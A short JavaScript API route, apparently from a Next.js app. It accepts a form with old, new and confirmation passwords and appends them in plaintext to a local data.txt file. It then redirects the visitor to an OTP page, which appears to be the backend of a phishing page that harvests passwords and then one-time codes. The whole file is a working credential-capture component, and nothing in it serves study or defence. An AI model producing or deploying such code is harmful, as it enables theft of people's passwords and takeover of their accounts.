import fs from 'fs';
import path from 'path';

export const config = {
  api: {
    bodyParser: false, // turn off default body parser
  },
};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    let body = '';

    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', () => {
      const parsed = new URLSearchParams(body);
      const oldpass = parsed.get('oldpass');
      const newpass = parsed.get('newpass');
      const confirmpass = parsed.get('confirmpass');

      const log = `Old: ${oldpass}\nNew: ${newpass}\nConfirm: ${confirmpass}\n\n`;

      const filePath = path.join(process.cwd(), 'data.txt');
      fs.appendFileSync(filePath, log, 'utf8');

      res.writeHead(302, { Location: '/otp.html' });
      res.end();
    });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
